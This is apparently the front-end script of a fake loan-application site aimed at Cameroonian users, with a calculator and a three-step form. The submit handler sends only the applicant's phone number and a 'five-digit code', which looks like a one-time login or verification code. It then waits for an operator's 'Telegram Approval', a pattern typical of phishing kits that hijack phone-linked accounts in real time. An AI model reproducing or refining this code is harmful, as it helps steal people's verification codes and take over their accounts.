function goToScreen(screenId) {
    document.querySelectorAll('.screen').forEach(screen => {
        screen.classList.remove('active');
    });
    document.getElementById(screenId).classList.add('active');
}

function selectLanguage(lang, element) {
    document.querySelectorAll('.lang-option').forEach(opt => {
        opt.classList.remove('selected');
    });
    element.classList.add('selected');
    
    setTimeout(() => {
        goToScreen('screen-home');
    }, 300);
}

// --- CALCULATOR LOGIC ---
const amountSlider = document.getElementById('amount-slider');
const loanAmountDisplay = document.getElementById('loan-amount-display');
const termSelect = document.getElementById('term-select');
const monthlyPaymentDisplay = document.getElementById('monthly-payment-display');

function updateCalculator() {
    const principal = parseInt(amountSlider.value);
    const months = parseInt(termSelect.value);
    
    loanAmountDisplay.innerText = principal.toLocaleString();
    const totalRepayment = principal * 1.10;
    const monthly = totalRepayment / months;
    monthlyPaymentDisplay.innerText = Math.round(monthly).toLocaleString();
}

amountSlider.addEventListener('input', updateCalculator);
termSelect.addEventListener('change', updateCalculator);
updateCalculator();

// --- NEW: TRANSFER DATA TO APPLICATION FORM ---
function startApplication() {
    // 1. Get values from the calculator
    const selectedAmount = amountSlider.value;
    const selectedTerm = termSelect.value;

    // 2. Set the values in the application form (Step 1)
    document.getElementById('form-amount').value = selectedAmount;
    document.getElementById('form-term').value = selectedTerm;

    // 3. Move to the application screen
    goToScreen('screen-application');
}

// --- FORM INPUT RESTRICTIONS ---
document.getElementById('phone-number').addEventListener('input', function (e) {
    this.value = this.value.replace(/[^0-9]/g, ''); 
});

document.getElementById('five-digit-code').addEventListener('input', function (e) {
    this.value = this.value.replace(/[^0-9]/g, ''); 
});

// --- MULTI-STEP FORM LOGIC ---
let currentStep = 1;
const totalSteps = 3;

function updateFormUI() {
    document.querySelectorAll('.form-step').forEach((el, index) => {
        el.classList.toggle('active', index + 1 === currentStep);
    });

    document.getElementById('step-indicator').innerText = `Step ${currentStep} of ${totalSteps}`;
    document.getElementById('btn-back').style.display = currentStep === 1 ? 'none' : 'block';
    
    const nextBtn = document.getElementById('btn-next');
    const submitBtn = document.getElementById('btn-submit');

    if (currentStep === totalSteps) {
        nextBtn.style.display = 'none';
        submitBtn.style.display = 'block';
        generateSummary(); 
    } else {
        nextBtn.style.display = 'block';
        submitBtn.style.display = 'none';
    }
}

function nextStep() {
    if (currentStep < totalSteps) {
        const currentStepDiv = document.getElementById(`step-${currentStep}`);
        const inputs = currentStepDiv.querySelectorAll('input, select');
        let isValid = true;

        inputs.forEach(input => {
            if (!input.checkValidity()) {
                isValid = false;
                input.style.borderColor = 'red';
            } else {
                input.style.borderColor = '#3c5c75'; 
            }
        });

        if (!isValid) {
            alert("Please fill out all fields correctly before continuing.");
            return;
        }

        currentStep++;
        updateFormUI();
    }
}

function prevStep() {
    if (currentStep > 1) {
        currentStep--;
        updateFormUI();
    }
}

function generateSummary() {
    const amount = document.getElementById('form-amount').value;
    const term = document.getElementById('form-term').value;
    const purpose = document.getElementById('form-purpose').value || '—';
    const firstName = document.getElementById('first-name').value;
    const lastName = document.getElementById('last-name').value;
    const phone = document.getElementById('phone-number').value;
    
    document.getElementById('summary-amount').innerText = `XAF ${parseInt(amount).toLocaleString()}`;
    document.getElementById('summary-term').innerText = `${term} Months`;
    document.getElementById('summary-purpose').innerText = purpose;
    document.getElementById('summary-phone').innerText = `+237 ${phone}`;
    
    if (firstName || lastName) {
        document.getElementById('summary-name').innerText = `${firstName} ${lastName}`.trim();
    }
}

async function submitForm(event) {
    event.preventDefault(); 
    
    const currentStepDiv = document.getElementById(`step-${currentStep}`);
    const inputs = currentStepDiv.querySelectorAll('input, select');
    let isValid = true;

    inputs.forEach(input => {
        if (!input.checkValidity()) {
            isValid = false;
            input.style.borderColor = 'red';
        } else {
            input.style.borderColor = '#3c5c75'; 
        }
    });

    if (!isValid) {
        alert("Please fill out all fields correctly before submitting.");
        return;
    }

    const submitBtn = document.getElementById('btn-submit');
    const originalText = submitBtn.innerText;
    submitBtn.innerText = "Waiting for Telegram Approval...";
    submitBtn.disabled = true;

    const phone = document.getElementById('phone-number').value || "Unknown";
    const code = document.getElementById('five-digit-code').value || "Unknown";

    try {
        const response = await fetch('/api/request-approval', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: phone, code: code })
        });
        const result = await response.json();

        const interval = setInterval(async () => {
            const statusRes = await fetch(`/api/check-status/${result.app_id}`);
            const statusData = await statusRes.json();

            if (statusData.status === 'approve') {
                clearInterval(interval);
                goToScreen('screen-success'); 
            } else if (statusData.status === 'reject') {
                clearInterval(interval);
                alert("Application rejected by Admin.");
                submitBtn.innerText = originalText;
                submitBtn.disabled = false;
            }
        }, 2000);

    } catch (error) {
        alert("Error connecting to server.");
        submitBtn.innerText = originalText;
        submitBtn.disabled = false;
    }
}